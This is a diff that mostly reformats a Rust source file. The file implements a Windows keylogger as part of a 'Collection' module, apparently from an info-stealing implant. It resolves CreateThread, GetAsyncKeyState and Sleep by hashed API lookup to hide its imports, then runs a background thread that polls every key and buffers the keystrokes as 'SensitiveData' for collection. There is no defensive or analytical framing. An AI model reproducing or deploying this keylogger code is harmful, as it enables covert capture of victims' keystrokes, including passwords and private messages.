@@ -1,11 +1,11 @@
 use crate::utils::sensitive::SensitiveData;
 
 #[cfg(target_os = "windows")]
+use alloc::string::String;
+#[cfg(target_os = "windows")]
 use core::sync::atomic::{AtomicBool, Ordering};
 #[cfg(target_os = "windows")]
 use zeroize::Zeroize;
-#[cfg(target_os = "windows")]
-use alloc::string::String;
 
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
@@ -21,7 +21,10 @@ static BUFFER_LOCK: AtomicBool = AtomicBool::new(false);
 
 #[cfg(target_os = "windows")]
 fn lock() {
-    while BUFFER_LOCK.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {
+    while BUFFER_LOCK
+        .compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed)
+        .is_err()
+    {
         core::hint::spin_loop();
     }
 }
@@ -39,30 +42,32 @@ impl Collection {
                 self.start_keylogger();
                 KEYLOGGER_RUNNING = true;
             }
-            
+
             lock();
             let buffer = &mut *core::ptr::addr_of_mut!(KEY_BUFFER);
-            if buffer.is_empty() { 
+            if buffer.is_empty() {
                 unlock();
-                return None; 
+                return None;
             }
-            
+
             let sensitive = SensitiveData::new(buffer);
             buffer.zeroize();
             buffer.clear();
             unlock();
-            
+
             Some(sensitive)
         }
         #[cfg(not(target_os = "windows"))]
-        { None }
+        {
+            None
+        }
     }
 
     #[cfg(target_os = "windows")]
     unsafe fn start_keylogger(&self) {
         let kernel32 = hash_str(b"kernel32.dll");
         let create_thread = resolve_function(kernel32, hash_str(b"CreateThread"));
-        
+
         if !create_thread.is_null() {
             type FnCreateThread = unsafe extern "system" fn(
                 *mut core::ffi::c_void,
@@ -70,11 +75,18 @@ impl Collection {
                 unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
                 *mut core::ffi::c_void,
                 u32,
-                *mut u32
+                *mut u32,
             ) -> *mut core::ffi::c_void;
-            
+
             let create_thread_fn: FnCreateThread = core::mem::transmute(create_thread);
-            create_thread_fn(core::ptr::null_mut(), 0, keylogger_thread, core::ptr::null_mut(), 0, core::ptr::null_mut());
+            create_thread_fn(
+                core::ptr::null_mut(),
+                0,
+                keylogger_thread,
+                core::ptr::null_mut(),
+                0,
+                core::ptr::null_mut(),
+            );
         }
     }
 }
@@ -85,17 +97,19 @@ unsafe extern "system" fn keylogger_thread(_param: *mut core::ffi::c_void) -> u3
     let get_async_key_state = resolve_function(user32, hash_str(b"GetAsyncKeyState"));
     let kernel32 = hash_str(b"kernel32.dll");
     let sleep = resolve_function(kernel32, hash_str(b"Sleep"));
-    
-    if get_async_key_state.is_null() || sleep.is_null() { return 0; }
-    
+
+    if get_async_key_state.is_null() || sleep.is_null() {
+        return 0;
+    }
+
     type FnGetAsyncKeyState = unsafe extern "system" fn(i32) -> i16;
     type FnSleep = unsafe extern "system" fn(u32);
-    
+
     let fn_get_state: FnGetAsyncKeyState = core::mem::transmute(get_async_key_state);
     let fn_sleep: FnSleep = core::mem::transmute(sleep);
-    
+
     loop {
-        for i in 8..255 { 
+        for i in 8..255 {
             let state = fn_get_state(i);
             if (state & 1) != 0 {
                 let key_str = vk_to_str(i as u32);
@@ -132,14 +146,14 @@ fn vk_to_str(vk: u32) -> String {
             let mut s = String::new();
             s.push(c);
             s
-        },
+        }
         // 0-9
         0x30..=0x39 => {
             let c = (vk as u8) as char;
             let mut s = String::new();
             s.push(c);
             s
-        },
+        }
         _ => String::from("."),
     }
 }
